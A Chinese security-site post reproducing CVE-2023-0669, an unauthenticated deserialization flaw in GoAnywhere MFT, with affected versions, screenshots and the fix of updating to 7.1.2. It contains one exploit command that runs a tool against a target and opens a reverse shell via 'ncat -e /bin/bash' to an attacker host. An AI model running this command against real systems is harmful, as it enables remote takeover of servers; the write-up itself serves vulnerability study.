# CVE-2023-0669 GoAnywhereMFT反序列化漏洞复现

阅读量 **149514**

发布时间 : 2023-02-17 15:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

LONDON, ENGLAND – AUGUST 09: In this photo illustration, A woman is
silhouetted against a projection of a password log-in dialog box on August 09,
2017 in London, England. With so many areas of modern life requiring identity
verification, online security remains a constant concern, especially following
the recent spate of global hacks. (Photo by Leon Neal/Getty Images)

## 免责声明

文中提到的所有技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途，否则产生的一切后果自行承担，与本文作者无关！

## GoAnywhereMFT

GoAnywhereMFT是一个管理文件传输的解决方案，它简化了系统、员工、客户和贸易伙伴之间的数据交换。它通过广泛的安全设置、详细的审计跟踪提供集中控制，并帮助将文件中的信息处理为XML、EDI、CSV和JSON数据库。

## CVE-2023-0669

GoAnywhereMFT管理端存在反序列化漏洞，攻击者利用该漏洞无需登录便可以远程执行任意命令。漏洞被追踪为CVE-2023-0669。

## 影响范围

GoAnywhereMFT小于7.1.2版本

## 漏洞复现

工具使用说明：

![](https://p3.ssl.qhimg.com/t01e27405573ffe745e.png)

本地java版本：

![](https://p3.ssl.qhimg.com/t013096505573b7baa7.png)

使用命令反弹shell：  
`java -jar CVE-2023-0669.jar -p http://127.0.0.1:8080 -t http://x.x.x.x/ -c
"ncat -e /bin/bash yourvps yourport"`

![](https://p1.ssl.qhimg.com/t01cb333384b65d9b33.png)

> 注意：-p 代理 不可不指定，否则会报错，将流量转到burp即可

burp数据包：

![](https://p3.ssl.qhimg.com/t01eebe18daaca79dac.png)

工具下载地址：公众号回复CVE-2023-0669获取

## 漏洞修复

更新到7.1.2版本。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **黑客前沿** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/286390](/post/id/286390)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞复现](/tag/漏洞复现)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) 黑客前沿

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

